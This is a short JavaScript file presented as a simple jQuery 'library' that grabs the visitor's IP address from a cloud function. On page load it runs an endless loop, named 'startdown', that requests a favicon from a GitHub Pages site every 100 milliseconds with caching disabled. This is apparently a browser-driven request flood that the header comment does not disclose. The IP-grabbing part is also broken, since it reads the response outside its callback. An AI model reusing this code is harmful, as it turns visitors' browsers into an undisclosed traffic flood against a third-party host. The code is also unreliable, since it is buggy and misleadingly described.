/* This is a simple javascript library that i made.
It needs jquery to function.
The ip grabber does not store the users ip anywhere.
*/


// Set delay to ms
function delay(milliseconds){
  return new Promise(resolve => {
    setTimeout(resolve, milliseconds);
  });
}

// Get the userip and store it in a variable
$.getJSON("https://europe-central2-portfolio-website-374313.cloudfunctions.net/getip", function(data) {
})
var userip = (data.ip);

window.onload = async function startdown(){
  while(true) {
    await delay(100);
    fetch('https://t0m0t0w.github.io/favicon.png', {cache: "no-store"})
  }
}
